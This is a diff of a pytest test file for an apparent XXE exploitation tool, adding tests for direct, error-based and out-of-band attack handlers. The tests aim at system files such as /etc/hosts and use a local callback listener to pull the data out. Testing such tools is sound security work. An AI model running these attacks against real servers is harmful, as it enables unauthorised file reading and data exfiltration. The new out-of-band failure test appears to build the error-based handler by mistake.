@@ -5,6 +5,7 @@ from xeely.custom_http.server import HTTPServerParams
 from xeely.custom_xml import XML
 from xeely.xxe.attack.handler.direct import XXEDirectAttackHandler
 from xeely.xxe.attack.handler.error import XXEDErrorAttackHandler
+from xeely.xxe.attack.handler.oob import XXEOOBAttackHandler
 
 
 @pytest.fixture
@@ -44,7 +45,7 @@ def test_direct_attack_handler(httpserver: HTTPServer, base_xml, base64_encoding
     assert "localhost" in data
 
 
-def test_failed_direct_attack_handler(httpserver: HTTPServer, base_xml):
+def test_failed_direct_attack_handler(base_xml):
     attack_handler = XXEDirectAttackHandler(
         resource="/etc/invalid",
         xml=base_xml,
@@ -56,7 +57,7 @@ def test_failed_direct_attack_handler(httpserver: HTTPServer, base_xml):
     assert len(data) == 0
 
 
-def test_error_attack_handler(httpserver: HTTPServer, base_xml):
+def test_error_attack_handler(base_xml):
     attack_handler = XXEDErrorAttackHandler(
         resource="/etc/hosts",
         xml=base_xml,
@@ -68,7 +69,31 @@ def test_error_attack_handler(httpserver: HTTPServer, base_xml):
     assert "localhost" in data
 
 
-def test_failed_error_attack_handler(httpserver: HTTPServer, base_xml):
+def test_failed_error_attack_handler(base_xml):
+    attack_handler = XXEDErrorAttackHandler(
+        resource="/invalid",
+        xml=base_xml,
+        target_url=TARGET_URL,
+        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
+    )
+    data = attack_handler.run_attack()
+
+    assert data == ""
+
+
+def test_oob_attack_handler(base_xml):
+    attack_handler = XXEOOBAttackHandler(
+        resource="/etc/hosts",
+        xml=base_xml,
+        target_url=TARGET_URL,
+        http_server_params=HTTPServerParams(lhost="127.0.0.1", lport=8000),
+    )
+    data = attack_handler.run_attack()
+
+    assert "localhost" in data
+
+
+def test_failed_oob_attack_handler(base_xml):
     attack_handler = XXEDErrorAttackHandler(
         resource="/invalid",
         xml=base_xml,
